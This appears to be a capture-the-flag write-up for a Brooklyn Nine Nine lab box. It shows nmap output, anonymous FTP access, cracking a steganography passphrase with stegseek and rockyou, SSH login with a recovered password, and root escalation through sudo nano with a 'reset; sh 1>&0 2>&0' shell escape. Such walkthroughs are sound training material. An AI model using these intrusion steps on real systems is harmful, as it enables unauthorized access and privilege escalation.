@@ -1,1 +1,125 @@
 
+
+nmap
+
+Nmap scan report for ip-10-10-94-88.eu-west-1.compute.internal (10.10.94.88)
+Host is up (0.011s latency).
+Not shown: 1997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.150.2
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (EdDSA)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 02:07:F7:72:6B:C5 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=3/16%OT=21%CT=1%CU=34886%PV=Y%DS=1%DC=D%G=Y%M=0207F7%T
+OS:M=65F4F6F2%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A
+OS:)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
+OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
+OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
+OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
+OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 10.783 days (since Tue Mar  5 06:46:39 2024)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=257 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+=================================================================================================================================
+
+NMAP results are interesting - they show an ftp server that has anon. login enabled
+We do so and find the following file that we download and read on our attacking machine:
+
+cat note_to_jake.txt
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+
+We now navigate to the web server
+We are greeted with a picture - checking page source reveals a comment that says the following:
+<!-- Have you ever heard of steganography? -->
+
+With this clue, we download the image and run the following tool against it:
+steghide
+
+Download the latest stegseek release      - https://github.com/RickdeJager/stegseek/releases
+Install the .deb file using -          sudo apt install ./stegseek_0.6-1.deb
+
+stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "admin"
+[i] Original filename: "note.txt".
+[i] Extracting to "brooklyn99.jpg.out".
+
+
+cat brooklyn99.jpg.out
+Holts Password:
+fluffydog12@ninenine
+
+Enjoy!!
+
+
+ssh holt@10.10.94.88
+
+cat user.txt
+
+sudo -l
+Matching Defaults entries for holt on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+
+
+sudo nano /root/root.txt
+
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: ---------------------------------
+
+Enjoy!!
+
+we also could have done:
+sudo nano
+then press:
+ctrl+R
+ctrl+X
+Then in the execute command prompt enter the following:
+reset; sh 1>&0 2>&0
+
+You should now have root access!
+
+
+
+
+gobuster dir -u http://10.10.94.88:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
